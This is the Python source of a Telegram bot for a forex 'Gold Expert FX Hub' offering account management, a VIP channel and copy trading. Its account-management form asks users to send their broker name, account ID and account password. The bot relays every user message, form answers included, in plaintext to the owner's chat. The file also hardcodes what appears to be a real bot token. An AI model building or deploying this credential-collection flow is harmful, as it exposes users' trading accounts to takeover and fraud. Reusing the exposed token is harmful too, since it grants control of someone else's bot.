import requests, sqlite3, time, threading, re, sys
from datetime import datetime

API_TOKEN = "8851943854:AAGfy9xw9srlQCE5g_yH0hMYqjPsI5NC-e4"  # ⚠️ Yahan apna Real Token daalein
OWNER_ID = 7415265825  # 👑 Admin ID (Prince Bhai)

FREE_GROUP_ID = -4477244119  
PRIVATE_CHANNEL_ID = -3870933647  
DB_NAME = "gold_expert_ultimate.db"

if not API_TOKEN: sys.exit(1)
BASE_URL = f"https://api.telegram.org/bot{API_TOKEN}"

# --- DATABASE LAYER ---
def db_run(query, params=(), fetch=False, multi=False):
    try:
        with sqlite3.connect(DB_NAME, timeout=30) as conn:
            c = conn.cursor(); c.execute(query, params)
            if fetch: return c.fetchall() if multi else c.fetchone()
            conn.commit()
    except Exception as e:
        return None

def init_db():
    db_run("CREATE TABLE IF NOT EXISTS pending_channel_requests (user_id INTEGER, chat_id INTEGER, request_time REAL, PRIMARY KEY (user_id, chat_id))")
    db_run("CREATE TABLE IF NOT EXISTS users_profile (user_id INTEGER PRIMARY KEY, first_name TEXT, username TEXT, join_date REAL)")
    db_run("CREATE TABLE IF NOT EXISTS dynamic_content (service_key TEXT PRIMARY KEY, text_content TEXT)")
    db_run("CREATE TABLE IF NOT EXISTS admin_state (admin_id INTEGER PRIMARY KEY, mode TEXT, target_id TEXT)")
    db_run("CREATE TABLE IF NOT EXISTS schedules (id INTEGER PRIMARY KEY AUTOINCREMENT, post_text TEXT, run_time TEXT, is_active INTEGER DEFAULT 1)")

init_db()

def get_content(k, d):
    r = db_run("SELECT text_content FROM dynamic_content WHERE service_key = ?", (k,), fetch=True)
    return r[0] if r and r[0] else d

def get_main_keyboard():
    return {"inline_keyboard": [
        [{"text": "💼 Account Management Services", "callback_data": "srv_account"}],
        [{"text": "👑 VIP Premium Private Channel", "callback_data": "srv_vip"}],
        [{"text": "📋 Copy Trading Service", "callback_data": "srv_copy"}]
    ]}

# --- LIVE LOGGER TO OWNER ---
def send_live_log_to_owner(user_info, action_details):
    tag = f"@{user_info.get('username')}" if user_info.get('username') else "No Username"
    log_msg = (
        "📩 **New Activity Log**\n\n"
        "👤 **From:** {name}\n"
        "🔗 ({username_tag})\n"
        "🆔 **ID:** `{uid}`\n\n"
        "⚡ **Action:** {action}"
    ).format(
        name=user_info.get('first_name', 'Trader'),
        username_tag=tag,
        uid=user_info.get('id'),
        action=action_details
    )
    requests.post(f"{BASE_URL}/sendMessage", json={"chat_id": OWNER_ID, "text": log_msg, "parse_mode": "Markdown"})

# --- INCOMING MESSAGE HANDLER ---
def handle_incoming_message(msg):
    chat_id = msg.get("chat", {}).get("id")
    message_id = msg.get("message_id")
    text = msg.get("text", "")
    f_user = msg.get("from", {})
    uid = f_user.get("id")
    
    if not uid: return

    # 🛡️ Link Cleaner & System Logs Cleaner (Only inside Community Group)
    if chat_id == FREE_GROUP_ID:
        if "new_chat_members" in msg or "left_chat_member" in msg:
            requests.post(f"{BASE_URL}/deleteMessage", json={"chat_id": chat_id, "message_id": message_id})
            return
        if text and uid != OWNER_ID:
            if re.search(r'(https?://[^\s]+|www\.[^\s]+|\bt\.me/[^\s]+|[a-zA-r0-9\-\.]+\.(com|net|org|xyz|info|co|biz))', text, re.I):
                requests.post(f"{BASE_URL}/deleteMessage", json={"chat_id": chat_id, "message_id": message_id})
                return

    # Private Chat Actions
    if msg.get("chat", {}).get("type") == "private":
        db_run("INSERT OR IGNORE INTO users_profile VALUES (?, ?, ?, ?)", (uid, f_user.get("first_name"), f_user.get("username"), time.time()))

        if uid == OWNER_ID:
            state = db_run("SELECT mode, target_id FROM admin_state WHERE admin_id = ?", (OWNER_ID,), fetch=True)
            
            if state and state[0] == "EDITING":
                target_key = state[1]
                db_run("INSERT OR REPLACE INTO dynamic_content (service_key, text_content) VALUES (?, ?)", (target_key, text))
                db_run("DELETE FROM admin_state WHERE admin_id = ?", (OWNER_ID,))
                requests.post(f"{BASE_URL}/sendMessage", json={"chat_id": OWNER_ID, "text": f"✅ **Saved Perfectly:** `{target_key}` configuration database updated live!"})
                return

            if state and state[0] == "REPLYING":
                target_user = state[1]
                requests.post(f"{BASE_URL}/sendMessage", json={"chat_id": target_user, "text": f"📩 **Message From Admin:**\n\n{text}"})
                db_run("DELETE FROM admin_state WHERE admin_id = ?", (OWNER_ID,))
                requests.post(f"{BASE_URL}/sendMessage", json={"chat_id": OWNER_ID, "text": "✅ Reply sent successfully to user inbox."})
                return

            if text and text.startswith("/schedule"):
                try:
                    parts = text.split(" ", 2)
                    db_run("INSERT INTO schedules (post_text, run_time, is_active) VALUES (?, ?, 1)", (parts[2], parts[1]))
                    requests.post(f"{BASE_URL}/sendMessage", json={"chat_id": OWNER_ID, "text": f"📅 **Scheduled:** Post will go live at `{parts[1]}` (Mon-Fri Filter)."})
                except: 
                    requests.post(f"{BASE_URL}/sendMessage", json={"chat_id": OWNER_ID, "text": "❌ **Format:** `/schedule HH:MM Your Message`"})
                return

            if text == "/start":
                requests.post(f"{BASE_URL}/sendMessage", json={"chat_id": OWNER_ID, "text": "👑 **Welcome Prince Bhai.** Master System Ready.", "reply_markup": {"keyboard": [[{"text": "👥 View Total Users"}, {"text": "✏️ Live Edit Messages"}]], "resize_keyboard": True}})
                return

            if text == "👥 View Total Users":
                rows = db_run("SELECT user_id, first_name, username FROM users_profile", fetch=True, multi=True)
                if not rows:
                    requests.post(f"{BASE_URL}/sendMessage", json={"chat_id": OWNER_ID, "text": "📭 No active users found."})
                    return
                requests.post(f"{BASE_URL}/sendMessage", json={"chat_id": OWNER_ID, "text": f"📊 **Total Database Users:** `{len(rows)}`"})
                for r in rows:
                    tag = f"(@{r[2]})" if r[2] else ""
                    kb = {"inline_keyboard": [[{"text": f"💬 Chat with {r[1]}", "callback_data": f"chat_usr_{r[0]}"}]]}
                    requests.post(f"{BASE_URL}/sendMessage", json={"chat_id": OWNER_ID, "text": f"👤 {r[1]} {tag}\n🆔 `{r[0]}`", "reply_markup": kb})
                return

            if text == "✏️ Live Edit Messages":
                kb = {"inline_keyboard": [
                    [{"text": "📝 Edit Account Mgmt Terms", "callback_data": "edt_account"}],
                    [{"text": "📝 Edit Account Form", "callback_data": "edt_form_account"}],
                    [{"text": "📝 Edit VIP Main Text", "callback_data": "edt_vip"}],
                    [{"text": "📝 Edit VIP Form Details", "callback_data": "edt_form_vip"}],
                    [{"text": "📝 Edit Copy Trading Info", "callback_data": "edt_copy"}]
                ]}
                requests.post(f"{BASE_URL}/sendMessage", json={"chat_id": OWNER_ID, "text": "🛠️ **Select section to update dynamic content live:**", "reply_markup": kb})
                return

        # User side tracking execution logs
        if text == "/start":
            send_live_log_to_owner(f_user, "Started the Bot (`/start`)")
            w_msg = f"👋 **Hello, {f_user.get('first_name', 'Trader')}!**\n\nWelcome to **Gold Expert FX Hub**. Select our services below:"
            requests.post(f"{BASE_URL}/sendMessage", json={"chat_id": chat_id, "text": w_msg, "parse_mode": "Markdown", "reply_markup": get_main_keyboard()})
            return

        # If user inputs form answers or plain messages, notify owner instantly
        if uid != OWNER_ID:
            send_live_log_to_owner(f_user, f"Sent Message/Form Data:\n`{text}`")

# --- CALLBACK ROUTER SYSTEM ---
def handle_callback_query(cb):
    uid = cb["from"]["id"]; chat_id = cb["message"]["chat"]["id"]
    msg_id = cb["message"]["message_id"]; data = cb["data"]; f_user = cb["from"]
    requests.post(f"{BASE_URL}/answerCallbackQuery", json={"callback_query_id": cb["id"]})

    # Admin Callback Actions
    if uid == OWNER_ID:
        if data.startswith("edt_"):
            clean_key = data.replace("edt_", "")
            db_run("INSERT OR REPLACE INTO admin_state VALUES (?, ?, ?)", (OWNER_ID, "EDITING", clean_key))
            requests.post(f"{BASE_URL}/sendMessage", json={"chat_id": OWNER_ID, "text": f"📥 **Editing Mode Active for:** `{clean_key}`\n\nPaste/Send the new layout message content now:"})
            return
            
        if data.startswith("chat_usr_"):
            target_id = data.replace("chat_usr_", "")
            db_run("INSERT OR REPLACE INTO admin_state VALUES (?, ?, ?)", (OWNER_ID, "REPLYING", target_id))
            requests.post(f"{BASE_URL}/sendMessage", json={"chat_id": OWNER_ID, "text": f"⌨️ **Direct Chat Active with ID:** `{target_id}`\n\nType your reply below and hit send:"})
            return

    # Client Dynamic Framework
    d_acc = "💼 **Account Management Service**\n\nMinimum Equity Requirement: $500\nProfit Split: 50/50"
    d_f_acc = "Format Required:\n1) Broker Name -\n2) Account ID -\n3) Password -"
    d_vip = "👑 **VIP Premium Private Channel**\n\nJoin for Daily Gold target setups."
    d_f_vip = "VIP Access Form:\nSend your payment screenshot."
    d_cpy = "📋 **Copy Trading Service**\n\nAutomate your portfolio seamlessly."

    if data == "m_menu":
        requests.post(f"{BASE_URL}/editMessageText", json={"chat_id": chat_id, "message_id": msg_id, "text": "👋 Select system parameters:", "reply_markup": get_main_keyboard()})
    elif data == "srv_account":
        send_live_log_to_owner(f_user, "Clicked: Account Management Service")
        kb = {"inline_keyboard": [[{"text": "🚀 Apply Now", "callback_data": "join_account"}], [{"text": "⬅️ Back", "callback_data": "m_menu"}]]}
        requests.post(f"{BASE_URL}/editMessageText", json={"chat_id": chat_id, "message_id": msg_id, "text": get_content("account", d_acc), "reply_markup": kb})
    elif data == "join_account":
        send_live_log_to_owner(f_user, "Clicked: Account Application Form")
        kb = {"inline_keyboard": [[{"text": "⬅️ Back", "callback_data": "srv_account"}]]}
        requests.post(f"{BASE_URL}/editMessageText", json={"chat_id": chat_id, "message_id": msg_id, "text": get_content("form_account", d_f_acc), "reply_markup": kb})
    elif data == "srv_vip":
        send_live_log_to_owner(f_user, "Clicked: VIP Private Channel Info")
        kb = {"inline_keyboard": [[{"text": "⭐ Join VIP Panel", "callback_data": "join_vip"}], [{"text": "⬅️ Back", "callback_data": "m_menu"}]]}
        requests.post(f"{BASE_URL}/editMessageText", json={"chat_id": chat_id, "message_id": msg_id, "text": get_content("vip", d_vip), "reply_markup": kb})
    elif data == "join_vip":
        send_live_log_to_owner(f_user, "Clicked: VIP Registration Form")
        kb = {"inline_keyboard": [[{"text": "⬅️ Back", "callback_data": "srv_vip"}]]}
        requests.post(f"{BASE_URL}/editMessageText", json={"chat_id": chat_id, "message_id": msg_id, "text": get_content("form_vip", d_f_vip), "reply_markup": kb})
    elif data == "srv_copy":
        send_live_log_to_owner(f_user, "Clicked: Copy Trading Service")
        kb = {"inline_keyboard": [[{"text": "⬅️ Back", "callback_data": "m_menu"}]]}
        requests.post(f"{BASE_URL}/editMessageText", json={"chat_id": chat_id, "message_id": msg_id, "text": get_content("copy", d_cpy), "reply_markup": kb})

# --- WORKER FOR BACKGROUND TASKS ---
def cron_worker():
    while True:
        # Automated approvals processing loop
        try:
            reqs = db_run("SELECT user_id, chat_id FROM pending_channel_requests", fetch=True, multi=True)
            if reqs:
                for uid, cid in reqs:
                    if requests.post(f"{BASE_URL}/approveChatJoinRequest", json={"chat_id": cid, "user_id": uid}).json().get("ok"):
                        db_run("DELETE FROM pending_channel_requests WHERE user_id = ? AND chat_id = ?", (uid, cid))
        except: pass
        
        # Mon-Fri Post Transmitter Scheduler
        try:
            now = datetime.now()
            if now.weekday() <= 4:
                jobs = db_run("SELECT id, post_text FROM schedules WHERE run_time = ? AND is_active = 1", (now.strftime("%H:%M"),), fetch=True, multi=True)
                if jobs:
                    for j in jobs:
                        if requests.post(f"{BASE_URL}/sendMessage", json={"chat_id": PRIVATE_CHANNEL_ID, "text": j[1], "parse_mode": "Markdown"}).json().get("ok"):
                            db_run("UPDATE schedules SET is_active = 0 WHERE id = ?", (j[0],))
        except: pass
        time.sleep(20)

# --- BOT MAIN CORE EXECUTION ---
def main():
    threading.Thread(target=cron_worker, daemon=True).start()
    print("🚀 Ultimate Master Core Active...")
    offset = 0
    while True:
        try:
            res = requests.post(f"{BASE_URL}/getUpdates", json={"offset": offset, "timeout": 20, "allowed_updates": ["message", "callback_query", "chat_join_request"]}).json()
            if res.get("ok"):
                for u in res["result"]:
                    offset = u["update_id"] + 1
                    if "chat_join_request" in u:
                        r = u["chat_join_request"]
                        # Log incoming request to Owner live
                        send_live_log_to_owner(r["from"], f"Requested to join Channel/Group (Chat ID: `{r['chat']['id']}`)")
                        if not requests.post(f"{BASE_URL}/approveChatJoinRequest", json={"chat_id": r["chat"]["id"], "user_id": r["from"]["id"]}).json().get("ok"):
                            db_run("INSERT OR IGNORE INTO pending_channel_requests VALUES (?, ?, ?)", (r["from"]["id"], r["chat"]["id"], time.time()))
                    elif "message" in u: handle_incoming_message(u["message"])
                    elif "callback_query" in u: handle_callback_query(u["callback_query"])
        except: time.sleep(4)

if __name__ == "__main__":
    main()
        
